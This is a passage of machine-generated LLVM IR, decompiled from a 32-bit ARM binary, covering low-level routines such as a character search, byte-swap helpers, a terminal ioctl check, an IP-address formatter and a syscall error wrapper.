dec_label_pc_122f4.dec_label_pc_122f4_crit_edge:  ; preds = %dec_label_pc_122f4
  %v0_122f8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_122f8.pre to i8
  br label %dec_label_pc_122f4

dec_label_pc_12300:                               ; preds = %dec_label_pc_122d8, %dec_label_pc_122f4, %dec_label_pc_122bc, %dec_label_pc_122d0
  %v2_12300 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_12300, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_122f8, { 1, 0 }
  uselistorder i32 %v0_122f4, { 1, 0 }
  uselistorder i32 %v6_122e0, { 0, 2, 1 }
  uselistorder i32 %v1_122d0, { 2, 1, 0 }
  uselistorder i32 %v2_122c0, { 1, 0 }
  uselistorder i32 %v1_122b0, { 1, 0 }
  uselistorder i32 %v0_122ac, { 1, 0 }
  uselistorder i32 %v6_122a0, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12300, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_122d8, { 1, 0 }
}

define i32 @function_12308(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12308:
  %v1_1230c = urem i32 %arg1, 256
  %v0_1232c3 = load i32, i32* @r0, align 4
  %v1_1232c4 = urem i32 %v0_1232c3, 4
  %v2_1232c5 = icmp eq i32 %v1_1232c4, 0
  br i1 %v2_1232c5, label %dec_label_pc_12334, label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %dec_label_pc_12308, %dec_label_pc_12328
  %v0_12328 = phi i32 [ %v1_12328, %dec_label_pc_12328 ], [ %v0_1232c3, %dec_label_pc_12308 ]
  %v1_12314 = inttoptr i32 %v0_12328 to i8*
  %v2_12314 = load i8, i8* %v1_12314, align 1
  %v3_12314 = zext i8 %v2_12314 to i32
  %v9_12318 = icmp eq i32 %v3_12314, %v1_1230c
  br i1 %v9_12318, label %dec_label_pc_123e8, label %dec_label_pc_12320

dec_label_pc_12320:                               ; preds = %dec_label_pc_12314
  %v2_12320 = icmp eq i8 %v2_12314, 0
  br i1 %v2_12320, label %dec_label_pc_123e4, label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %dec_label_pc_12320
  %v1_12328 = add i32 %v0_12328, 1
  %v1_1232c = urem i32 %v1_12328, 4
  %v2_1232c = icmp eq i32 %v1_1232c, 0
  br i1 %v2_1232c, label %dec_label_pc_12334, label %dec_label_pc_12314

dec_label_pc_12334:                               ; preds = %dec_label_pc_12328, %dec_label_pc_12308
  %v0_12338 = phi i32 [ %v0_1232c3, %dec_label_pc_12308 ], [ %v1_12328, %dec_label_pc_12328 ]
  %v4_12334 = mul nuw nsw i32 %v1_1230c, 256
  %v5_12334 = or i32 %v4_12334, %v1_1230c
  %v4_1233c = mul i32 %v5_12334, 65536
  %v5_1233c = or i32 %v4_1233c, %v5_12334
  br label %dec_label_pc_12340

dec_label_pc_12340:                               ; preds = %dec_label_pc_123dc, %dec_label_pc_1237c, %dec_label_pc_12334
  %v0_123a4 = phi i32 [ %v0_12338, %dec_label_pc_12334 ], [ %v4_12340, %dec_label_pc_1237c ], [ %v4_12340, %dec_label_pc_123dc ]
  %v1_12340 = inttoptr i32 %v0_123a4 to i32*
  %v2_12340 = load i32, i32* %v1_12340, align 4
  %v4_12340 = add i32 %v0_123a4, 4
  %v2_12348 = xor i32 %v2_12340, %v5_1233c
  %v2_1234c = add i32 %v2_12348, 2130640639
  store i32 %v2_1234c, i32* @ip, align 4
  %v2_12354 = add i32 %v2_12340, 2130640639
  %v1_12358 = sub i32 -1, %v2_12340
  %v2_1235c = xor i32 %v2_12354, %v1_12358
  %v2_12368 = and i32 %v2_1235c, -2130640640
  %v2_12370 = icmp eq i32 %v2_12368, 0
  br i1 %v2_12370, label %dec_label_pc_1237c, label %dec_label_pc_12384

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12340
  %v1_12364 = sub i32 -1, %v2_12348
  %v2_1236c = xor i32 %v2_1234c, %v1_12364
  %v2_12374 = and i32 %v2_1236c, -2130640640
  %v2_1237c = icmp eq i32 %v2_12374, 0
  br i1 %v2_1237c, label %dec_label_pc_12340, label %dec_label_pc_12384

dec_label_pc_12384:                               ; preds = %dec_label_pc_12340, %dec_label_pc_1237c
  %v2_12384 = inttoptr i32 %v0_123a4 to i8*
  %v3_12384 = load i8, i8* %v2_12384, align 1
  %v4_12384 = zext i8 %v3_12384 to i32
  %v9_12388 = icmp eq i32 %v4_12384, %v1_1230c
  br i1 %v9_12388, label %dec_label_pc_123e8, label %dec_label_pc_12394

dec_label_pc_12394:                               ; preds = %dec_label_pc_12384
  %v2_12394 = icmp eq i8 %v3_12384, 0
  br i1 %v2_12394, label %dec_label_pc_123e4, label %dec_label_pc_1239c

dec_label_pc_1239c:                               ; preds = %dec_label_pc_12394
  %v1_1239c = add i32 %v0_123a4, 1
  %v2_1239c = inttoptr i32 %v1_1239c to i8*
  %v3_1239c = load i8, i8* %v2_1239c, align 1
  %v4_1239c = zext i8 %v3_1239c to i32
  %v9_123a0 = icmp eq i32 %v4_1239c, %v1_1230c
  br i1 %v9_123a0, label %dec_label_pc_123e8, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_1239c
  %v2_123ac = icmp eq i8 %v3_1239c, 0
  br i1 %v2_123ac, label %dec_label_pc_123e4, label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %dec_label_pc_123ac
  %v1_123b4 = add i32 %v0_123a4, 2
  %v2_123b4 = inttoptr i32 %v1_123b4 to i8*
  %v3_123b4 = load i8, i8* %v2_123b4, align 1
  %v4_123b4 = zext i8 %v3_123b4 to i32
  %v9_123b8 = icmp eq i32 %v4_123b4, %v1_1230c
  br i1 %v9_123b8, label %dec_label_pc_123e8, label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123b4
  %v2_123c4 = icmp eq i8 %v3_123b4, 0
  br i1 %v2_123c4, label %dec_label_pc_123e4, label %dec_label_pc_123cc

dec_label_pc_123cc:                               ; preds = %dec_label_pc_123c4
  %v1_123cc = add i32 %v0_123a4, 3
  %v2_123cc = inttoptr i32 %v1_123cc to i8*
  %v3_123cc = load i8, i8* %v2_123cc, align 1
  %v4_123cc = zext i8 %v3_123cc to i32
  %v9_123d0 = icmp eq i32 %v4_123cc, %v1_1230c
  br i1 %v9_123d0, label %dec_label_pc_123e8, label %dec_label_pc_123dc

dec_label_pc_123dc:                               ; preds = %dec_label_pc_123cc
  %v2_123dc = icmp eq i8 %v3_123cc, 0
  br i1 %v2_123dc, label %dec_label_pc_123e4, label %dec_label_pc_12340

dec_label_pc_123e4:                               ; preds = %dec_label_pc_12320, %dec_label_pc_123dc, %dec_label_pc_123c4, %dec_label_pc_123ac, %dec_label_pc_12394
  br label %dec_label_pc_123e8

dec_label_pc_123e8:                               ; preds = %dec_label_pc_12314, %dec_label_pc_123cc, %dec_label_pc_123b4, %dec_label_pc_1239c, %dec_label_pc_12384, %dec_label_pc_123e4
  %v1_123ec = phi i32 [ 0, %dec_label_pc_123e4 ], [ %v1_123cc, %dec_label_pc_123cc ], [ %v1_123b4, %dec_label_pc_123b4 ], [ %v1_1239c, %dec_label_pc_1239c ], [ %v0_123a4, %dec_label_pc_12384 ], [ %v0_12328, %dec_label_pc_12314 ]
  ret i32 %v1_123ec

; uselistorder directives
  uselistorder i32 %v4_12340, { 1, 0 }
  uselistorder i32 %v2_12340, { 0, 2, 1 }
  uselistorder i32 %v0_123a4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_12334, { 1, 0 }
  uselistorder i32 %v1_12328, { 1, 0, 2 }
  uselistorder i32 %v0_1232c3, { 2, 1, 0 }
  uselistorder i32 %v1_1230c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_123e8, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_123e4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12384, { 1, 0 }
  uselistorder label %dec_label_pc_12314, { 1, 0 }
}

define i32 @function_123f8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_123f8:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12400 = call i32 @function_12440()
  %v0_12404 = load i32, i32* @r4, align 4
  ret i32 %v0_12404
}

define i32 @function_12410(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12410:
  store i32 %arg1, i32* @r0, align 4
  store i32 169780, i32* @r2, align 4
  %v0_12428 = call i32 @function_17a00()
  ret i32 %v0_12428
}

define i32 @function_12440() local_unnamed_addr {
dec_label_pc_12440:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_12440 = load i32, i32* @r4, align 4
  %v9_12440 = load i32, i32* @r6, align 4
  %v0_12448 = load i32, i32* @r0, align 4
  store i32 144312, i32* @r6, align 4
  store i32 %v0_12448, i32* @ip, align 4
  %v0_12458 = load i32, i32* @r1, align 4
  store i32 %v0_12458, i32* @r7, align 4
  %v0_1245c = load i32, i32* @r2, align 4
  store i32 %v0_1245c, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_12448, 124
  br i1 %tmp, label %dec_label_pc_12494, label %dec_label_pc_12464

dec_label_pc_12464:                               ; preds = %dec_label_pc_12440
  br label %dec_label_pc_1247c

dec_label_pc_12470:                               ; preds = %dec_label_pc_1247c
  br i1 %v2_12488, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_12470
  %v2_12474 = add i32 %v1_1248c, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12470, %bb
  %v0_1247c1 = phi i32 [ %v1_1248c, %dec_label_pc_12470 ], [ %v2_12474, %bb ]
  %v1_12478 = add i32 %v0_12478, 1
  br label %dec_label_pc_1247c

dec_label_pc_1247c:                               ; preds = %dec_label_pc_12464, %bb15
  %v1_1248c = phi i32 [ %v0_12448, %dec_label_pc_12464 ], [ %v0_1247c1, %bb15 ]
  %v0_12478 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1a72c.252 to i32), %dec_label_pc_12464 ], [ %v1_12478, %bb15 ]
  store i32 %v0_12478, i32* @r5, align 4
  %v2_1247c = icmp eq i32 %v1_1248c, 0
  %v1_12480 = inttoptr i32 %v0_12478 to i8*
  %v2_12480 = load i8, i8* %v1_12480, align 1
  %v2_12488 = icmp eq i8 %v2_12480, 0
  br i1 %v2_1247c, label %dec_label_pc_12488, label %dec_label_pc_12470

dec_label_pc_12488:                               ; preds = %dec_label_pc_1247c
  br i1 %v2_12488, label %dec_label_pc_12494, label %bb16

bb16:                                             ; preds = %dec_label_pc_12488
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_124d0

dec_label_pc_12494:                               ; preds = %dec_label_pc_12488, %dec_label_pc_12440
  store i32 %v0_12448, i32* @r2, align 4
  %v3_1249c = ashr i32 %v0_12448, 31
  store i32 %v3_1249c, i32* @r3, align 4
  %v6_124b0 = bitcast i32* %stack_var_-25 to i8*
  %v7_124b0 = call i32 @function_1642c(i8* %v6_124b0)
  %v1_124b8 = add i32 %v7_124b0, -14
  store i32 %v1_124b8, i32* @r5, align 4
  %v0_124bc = load i32, i32* @r6, align 4
  %v2_124bc = add i32 %v0_124bc, -35996
  store i32 %v2_124bc, i32* @r1, align 4
  store i32 %v1_124b8, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_124c8 = call i32 @function_12050()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_124d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %bb16, %dec_label_pc_12494
  %v0_124d0 = phi i32 [ %v0_12478, %bb16 ], [ %v0_124d0.pre, %dec_label_pc_12494 ]
  store i32 %v0_124d0, i32* @r0, align 4
  %v0_124d4 = call i32 @function_11fd0()
  %v0_124d8 = load i32, i32* @r7, align 4
  %v2_124d8 = icmp eq i32 %v0_124d8, 0
  br i1 %v2_124d8, label %bb17, label %dec_label_pc_124d0._crit_edge

dec_label_pc_124d0._crit_edge:                    ; preds = %dec_label_pc_124d0
  %v1_124e4.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_124d0
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_124d0._crit_edge, %bb17
  %v1_124e4 = phi i32 [ %v1_124e4.pre, %dec_label_pc_124d0._crit_edge ], [ 0, %bb17 ]
  %v1_124e0 = add i32 %v0_124d4, 1
  %v3_124e4 = icmp uge i32 %v1_124e0, %v1_124e4
  %v9_124e4 = icmp eq i32 %v1_124e0, %v1_124e4
  %v2_124e8 = xor i1 %v3_124e4, true
  %v3_124e8 = or i1 %v9_124e4, %v2_124e8
  br i1 %v3_124e8, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_124e0, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_124f8 = phi i32 [ %v1_124e4, %bb18 ], [ %v1_124e0, %bb19 ]
  %v2_124ec = xor i1 %v9_124e4, true
  %v3_124ec = and i1 %v3_124e4, %v2_124ec
  br i1 %v3_124ec, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_124f0 = icmp eq i32 %v0_124f8, 0
  br i1 %v2_124f0, label %dec_label_pc_12514, label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %bb22
  store i32 %v0_124f8, i32* @r2, align 4
  %v0_124fc = load i32, i32* @r5, align 4
  store i32 %v0_124fc, i32* @r1, align 4
  store i32 %v0_124d8, i32* @r0, align 4
  %v0_12504 = call i32 @function_12050()
  %v0_12508 = load i32, i32* @r4, align 4
  %v1_12508 = load i32, i32* @r7, align 4
  %v2_12508 = add i32 %v1_12508, %v0_12508
  %v3_12510 = add i32 %v2_12508, -1
  %v4_12510 = inttoptr i32 %v3_12510 to i8*
  store i8 0, i8* %v4_12510, align 1
  br label %dec_label_pc_12514

dec_label_pc_12514:                               ; preds = %bb22, %dec_label_pc_124f8
  %v0_12514 = load i32, i32* %r6.global-to-local, align 4
  %v2_12514 = icmp eq i32 %v0_12514, 0
  br i1 %v2_12514, label %dec_label_pc_12524, label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %dec_label_pc_12514
  %v0_1251c = call i32 @function_1095c()
  %v0_12520 = load i32, i32* %r6.global-to-local, align 4
  %v2_12520 = inttoptr i32 %v0_1251c to i32*
  store i32 %v0_12520, i32* %v2_12520, align 4
  %v0_12524.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %dec_label_pc_12514, %dec_label_pc_1251c
  %v0_12524 = phi i32 [ 0, %dec_label_pc_12514 ], [ %v0_12524.pre, %dec_label_pc_1251c ]
  store i32 %v3_12440, i32* @r4, align 4
  store i32 %v9_12440, i32* %r6.global-to-local, align 4
  ret i32 %v0_12524

; uselistorder directives
  uselistorder i1 %v3_124e4, { 1, 0 }
  uselistorder i32 %v0_12478, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1248c, { 1, 0, 2 }
  uselistorder i32 %v0_12448, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_12524, { 1, 0 }
  uselistorder label %dec_label_pc_12514, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_124d0, { 1, 0 }
  uselistorder label %dec_label_pc_1247c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_12540(i32 %arg1) local_unnamed_addr {
dec_label_pc_12540:
  %stack_var_-68 = alloca i32, align 4
  %v2_12548 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_12548, i32* @r1, align 4
  %v0_1254c = call i32 @function_12564()
  %v1_12550 = sub i32 1, %v0_1254c
  %v2_12550 = icmp ult i32 %v0_1254c, 2
  br i1 %v2_12550, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_12540
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_12540, %bb
  %v1_12560 = phi i32 [ %v1_12550, %dec_label_pc_12540 ], [ 0, %bb ]
  ret i32 %v1_12560

; uselistorder directives
  uselistorder i32 %v0_1254c, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_12564() local_unnamed_addr {
dec_label_pc_12564:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_12564 = load i32, i32* @r4, align 4
  %v6_12564 = load i32, i32* @r5, align 4
  %v2_1256c = ptrtoint i32* %stack_var_-52 to i32
  %v0_12570 = load i32, i32* @r1, align 4
  store i32 %v0_12570, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_1257c = load i32, i32* @r0, align 4
  %v3_1257c = call i32 @function_10818(i32 %v0_1257c, i32 21505, i32 %v2_1256c)
  store i32 %v3_1257c, i32* %r0.global-to-local, align 4
  store i32 %v3_1257c, i32* @r5, align 4
  %v2_12580 = icmp eq i32 %v3_1257c, 0
  br i1 %v2_12580, label %dec_label_pc_12588, label %dec_label_pc_125cc

dec_label_pc_12588:                               ; preds = %dec_label_pc_12564
  %v4_12594 = zext i8 %tmp to i32
  store i32 %v4_12594, i32* @ip, align 4
  %v3_12598 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12598, i32* @r3, align 4
  %v1_1259c = load i32, i32* @r4, align 4
  %v2_1259c = add i32 %v1_1259c, 4
  %v3_1259c = inttoptr i32 %v2_1259c to i32*
  %v0_125a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_125a0 = load i32, i32* @r4, align 4
  %v2_125a0 = add i32 %v1_125a0, 8
  %v3_125a0 = inttoptr i32 %v2_125a0 to i32*
  store i32 %v0_125a0, i32* %v3_125a0, align 4
  %v0_125a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_125a4 = load i32, i32* @r4, align 4
  %v2_125a4 = add i32 %v1_125a4, 12
  %v3_125a4 = inttoptr i32 %v2_125a4 to i32*
  store i32 %v0_125a4, i32* %v3_125a4, align 4
  %v2_125a8 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_125a8, i32* @r1, align 4
  %v1_125b0 = load i32, i32* @r4, align 4
  %v2_125b0 = inttoptr i32 %v1_125b0 to i32*
  store i32 %v3_12598, i32* %v2_125b0, align 4
  %v0_125b4 = load i32, i32* @ip, align 4
  %v1_125b4 = trunc i32 %v0_125b4 to i8
  %v2_125b4 = load i32, i32* @r4, align 4
  %v3_125b4 = add i32 %v2_125b4, 16
  %v4_125b4 = inttoptr i32 %v3_125b4 to i8*
  store i8 %v1_125b4, i8* %v4_125b4, align 1
  %v0_125b8 = load i32, i32* @r4, align 4
  %v1_125b8 = add i32 %v0_125b8, 17
  store i32 %v1_125b8, i32* %r0.global-to-local, align 4
  %v4_125bc = call i32 @function_17ce8(i32 %v1_125b8, i32 %v2_125a8, i32 19, i32 %v3_12598)
  store i32 %v4_125bc, i32* %r0.global-to-local, align 4
  %v0_125c0 = load i32, i32* @r5, align 4
  store i32 %v0_125c0, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_125c8 = inttoptr i32 %v4_125bc to i8*
  %v3_125c8 = call i32 @function_11f30(i8* %v2_125c8, i32 %v0_125c0)
  store i32 %v3_125c8, i32* %r0.global-to-local, align 4
  %v0_125cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125cc:                               ; preds = %dec_label_pc_12564, %dec_label_pc_12588
  %v0_125cc = phi i32 [ %v3_1257c, %dec_label_pc_12564 ], [ %v0_125cc.pre, %dec_label_pc_12588 ]
  store i32 %v0_125cc, i32* %r0.global-to-local, align 4
  store i32 %v3_12564, i32* @r4, align 4
  store i32 %v6_12564, i32* @r5, align 4
  ret i32 %v0_125cc

; uselistorder directives
  uselistorder i32 %v0_125cc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_10818, { 1, 0 }
  uselistorder label %dec_label_pc_125cc, { 1, 0 }
}

define i32 @function_125e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_125e0:
  %v3_125e0 = udiv i32 %arg1, 256
  %v1_125e4 = mul i32 %arg1, 256
  %v4_125e8 = and i32 %v1_125e4, 65280
  %v5_125e8 = or i32 %v4_125e8, %v3_125e0
  ret i32 %v5_125e8
}

define i32 @function_125f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_125f0:
  %v5_12608 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_12608
}

define i32 @function_12610(i32 %arg1) local_unnamed_addr {
dec_label_pc_12610:
  %v3_12610 = udiv i32 %arg1, 256
  %v1_12614 = mul i32 %arg1, 256
  %v4_12618 = and i32 %v1_12614, 65280
  %v5_12618 = or i32 %v4_12618, %v3_12610
  ret i32 %v5_12618
}

define i32 @function_12620(i32 %arg1) local_unnamed_addr {
dec_label_pc_12620:
  %v5_12638 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_12638
}

define i32 @function_12640() local_unnamed_addr {
dec_label_pc_12640:
  %r1.global-to-local = alloca i32, align 4
  %v3_12640 = load i32, i32* @r4, align 4
  %v6_12640 = load i32, i32* @r5, align 4
  %v9_12640 = load i32, i32* @r6, align 4
  %v12_12640 = load i32, i32* @r7, align 4
  %v15_12640 = load i32, i32* @r8, align 4
  %v18_12640 = load i32, i32* @sb, align 4
  %v21_12640 = load i32, i32* @sl, align 4
  %v24_12640 = load i32, i32* @fp, align 4
  %v0_12644 = load i32, i32* @r0, align 4
  %v5_12660 = call i32 @llvm.bswap.i32(i32 %v0_12644)
  %v0_12664 = load i32, i32* @r1, align 4
  %v1_12664 = add i32 %v0_12664, 15
  store i32 %v1_12664, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_126a0

dec_label_pc_12684:                               ; preds = %dec_label_pc_126a0
  %v1_1268c = inttoptr i32 %v0_126bc to i8*
  %v2_1268c = call i32 @function_1642c(i8* %v1_1268c)
  %v0_12690 = load i32, i32* @r6, align 4
  %v2_12690 = icmp eq i32 %v0_12690, 0
  %v1_12694 = add i32 %v2_1268c, -1
  store i32 %v1_12694, i32* %r1.global-to-local, align 4
  br i1 %v2_12690, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_12684
  %v1_12698 = load i32, i32* @sl, align 4
  %v2_12698 = trunc i32 %v1_12698 to i8
  %v4_12698 = inttoptr i32 %v0_12690 to i8*
  store i8 %v2_12698, i8* %v4_12698, align 1
  %v0_1269c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12684, %bb
  %v0_1269c = phi i32 [ %v1_12694, %dec_label_pc_12684 ], [ %v0_1269c.pre, %bb ]
  store i32 %v0_1269c, i32* @r6, align 4
  %v0_126a0.pre = load i32, i32* @r5, align 4
  %v0_126a4.pre = load i32, i32* @r7, align 4
  %v1_126a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_126a0

dec_label_pc_126a0:                               ; preds = %dec_label_pc_12640, %bb17
  %v0_126bc = phi i32 [ %v1_12664, %dec_label_pc_12640 ], [ %v0_1269c, %bb17 ]
  %v1_126a4 = phi i32 [ %v5_12660, %dec_label_pc_12640 ], [ %v1_126a4.pre, %bb17 ]
  %v0_126a4 = phi i32 [ 255, %dec_label_pc_12640 ], [ %v0_126a4.pre, %bb17 ]
  %v0_126b4 = phi i32 [ 0, %dec_label_pc_12640 ], [ %v0_126a0.pre, %bb17 ]
  %v7_126a0 = icmp eq i32 %v0_126b4, 3
  store i1 %v7_126a0, i1* @cpsr_z, align 1
  %v2_126a4 = and i32 %v0_126a4, %v1_126a4
  store i32 %v2_126a4, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_126b0 = udiv i32 %v1_126a4, 256
  store i32 %v3_126b0, i32* @r4, align 4
  %v1_126b4 = add i32 %v0_126b4, 1
  store i32 %v1_126b4, i32* @r5, align 4
  %v7_126b8 = icmp sgt i32 %v0_126b4, 3
  br i1 %v7_126b8, label %dec_label_pc_126bc, label %dec_label_pc_12684

dec_label_pc_126bc:                               ; preds = %dec_label_pc_126a0
  %v1_126bc = add i32 %v0_126bc, 1
  store i32 %v3_12640, i32* @r4, align 4
  store i32 %v6_12640, i32* @r5, align 4
  store i32 %v9_12640, i32* @r6, align 4
  store i32 %v12_12640, i32* @r7, align 4
  store i32 %v15_12640, i32* @r8, align 4
  store i32 %v18_12640, i32* @sb, align 4
  store i32 %v21_12640, i32* @sl, align 4
  store i32 %v24_12640, i32* @fp, align 4
  ret i32 %v1_126bc

; uselistorder directives
  uselistorder i32 %v0_126b4, { 2, 0, 1 }
  uselistorder i32 %v0_1269c, { 1, 0 }
  uselistorder i32 (i8*)* @function_1642c, { 2, 0, 1 }
  uselistorder i32 46, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126a0, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_126cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_126cc:
  store i32 ptrtoint (i64** @global_var_29738.257 to i32), i32* @r1, align 4
  %v0_126dc = call i32 @function_12640()
  %v0_126e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_126e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_126cc
  %v3_126e0 = load i64, i64* bitcast (i64** @global_var_29738.257 to i64*), align 4
  %v6_126e0 = udiv i64 %v3_126e0, 4294967296
  %v7_126e0 = trunc i64 %v6_126e0 to i32
  %v5_126e42 = mul nuw nsw i64 %v6_126e0, 128
  %v6_126e44 = and i64 %v5_126e42, %v6_126e0
  %v6_126e4 = trunc i64 %v6_126e44 to i32
  store i32 %v6_126e4, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_126cc, %bb
  %v7_126e4 = phi i32 [ %v0_126dc, %dec_label_pc_126cc ], [ %v7_126e0, %bb ]
  ret i32 %v7_126e4

; uselistorder directives
  uselistorder i64 %v6_126e0, { 2, 0, 1 }
  uselistorder i64** @global_var_29738.257, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_126e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_126e8:
  %stack_var_-12 = alloca i32, align 4
  %v2_126f0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_126f0, i32* @r1, align 4
  %v0_126f4 = call i32 @function_17e38()
  %v2_126f8 = icmp eq i32 %v0_126f4, 0
  %v4_126fc = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_126f8, i32 -1, i32 %v4_126fc
  ret i32 %storemerge
}

define i32 @function_12710(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12710:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12710 = load i32, i32* @r7, align 4
  store i32 %v3_12710, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12738, label %dec_label_pc_12728

dec_label_pc_12728:                               ; preds = %dec_label_pc_12710
  %v0_12728 = call i32 @function_1095c()
  %v0_1272c = load i32, i32* %r7.global-to-local, align 4
  %v1_1272c = sub i32 0, %v0_1272c
  %v2_12730 = inttoptr i32 %v0_12728 to i32*
  store i32 %v1_1272c, i32* %v2_12730, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1273c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %dec_label_pc_12710, %dec_label_pc_12728
  %v2_1273c = phi i32 [ %v3_12710, %dec_label_pc_12710 ], [ %v2_1273c.pre, %dec_label_pc_12728 ]
  %v0_12738 = phi i32 [ %arg1, %dec_label_pc_12710 ], [ -1, %dec_label_pc_12728 ]
  store i32 %v2_1273c, i32* @r7, align 4
  ret i32 %v0_12738

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12738, { 1, 0 }
}

define i32 @function_12748(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12748:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12748 = load i32, i32* @r7, align 4
  store i32 %v3_12748, i32* %stack_var_-8, align 4
  %v0_12754 = load i32, i32* %r0.global-to-local, align 4
